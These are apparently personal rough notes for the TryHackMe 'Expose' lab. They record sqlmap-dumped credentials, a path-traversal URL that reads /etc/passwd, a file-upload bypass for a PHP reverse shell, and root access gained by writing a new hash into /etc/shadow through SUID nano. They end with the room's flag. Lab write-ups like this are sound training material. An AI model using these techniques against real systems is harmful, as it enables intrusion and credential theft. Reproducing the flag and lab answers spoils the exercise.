---
title: Expose
draft: 
tags:
  - thm
  - oscp
  - easy
---
These are some rough notes I took when in the Expose TryHackMe room. These are notes uploaded after the fact and from before my attempting to make detailed write-ups.
# Port Scanning
`nmap -p- <IP>`

Then use -sV on the services found.


```
Database: expose
Table: user
[1 entry]
+----+-----------------+---------------------+--------------------------------------+
| id | email           | created             | password                             |
+----+-----------------+---------------------+--------------------------------------+
| 1  | hacker@root.thm | 2023-02-21 09:05:46 | VeryDifficultPassword!!#@#@!#!@#1231 |
+----+-----------------+---------------------+--------------------------------------+

[11:47:01] [INFO] table 'expose.`user`' dumped to CSV file '/home/kali/.local/share/sqlmap/output/10.10.69.234/dump/expose/user.csv'
[11:47:01] [INFO] fetching columns for table 'config' in database 'expose'
[11:47:02] [INFO] retrieved: 'id'
[11:47:02] [INFO] retrieved: 'int'
[11:47:02] [INFO] retrieved: 'url'
[11:47:02] [INFO] retrieved: 'text'
[11:47:03] [INFO] retrieved: 'password'
[11:47:03] [INFO] retrieved: 'text'
[11:47:03] [INFO] fetching entries for table 'config' in database 'expose'
[11:47:03] [INFO] retrieved: '/file1010111/index.php'
[11:47:04] [INFO] retrieved: '1'
[11:47:04] [INFO] retrieved: '69c66901194a6486176e81f5945b8929'
[11:47:04] [INFO] retrieved: '/upload-cv00101011/index.php'
[11:47:04] [INFO] retrieved: '3'
[11:47:05] [INFO] retrieved: '// ONLY ACCESSIBLE THROUGH USERNAME STARTING WITH Z'
[11:47:05] [INFO] recognized possible password hashes in column 'password'

```



```
69c66901194a6486176e81f5945b8929
easytohack
```

After using that password on the /file1010111/index.php page, we can there use LFI
```
http://10.10.69.234:1337/file1010111/index.php?file=/../../../../../../../etc/passwd
```

```
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin sshd:x:109:65534::/run/sshd:/usr/sbin/nologin landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:111:1::/var/cache/pollinate:/bin/false ec2-instance-connect:x:112:65534::/nonexistent:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false mysql:x:113:119:MySQL Server,,,:/nonexistent:/bin/false zeamkish:x:1001:1001:Zeam Kish,1,1,:/home/zeamkish:/bin/bash ftp:x:114:121:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin bind:x:115:122::/var/cache/bind:/usr/sbin/nologin Debian-snmp:x:116:123::/var/lib/snmp:/bin/false redis:x:117:124::/var/lib/redis:/usr/sbin/nologin mosquitto:x:118:125::/var/lib/mosquitto:/usr/sbin/nologin fwupd-refresh:x:119:126:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
```

Now on the 
```
/upload-cv00101011/index.php
```
page we can login with the `zeamish` user

this page allows file uploads

We are able to upload a php reverse shell by naming it .png and then capturing the POST in burpsuite, and changing the name back to .php

we are able to use netcat to listen to the port specified, then navigate to the directory where the file was uploaded to thanks to the source code


Navigating to the user directories, we find

```
SSH CREDS
zeamkish
easytohack@123
```

Now we can run 

`find / -perm -04000 -type f -ls 2>/dev/null`

to find things with a SUID bit set

we find nano

nano can edit /etc/shadow file

```
$ openssl passwd -1 -salt root 1234 
$1$root$.fAWE/htZAqQge.bvM16O/
```

add this to the /etc/shadow for root

```
THM{ROOT_EXPOSED_1001}
```

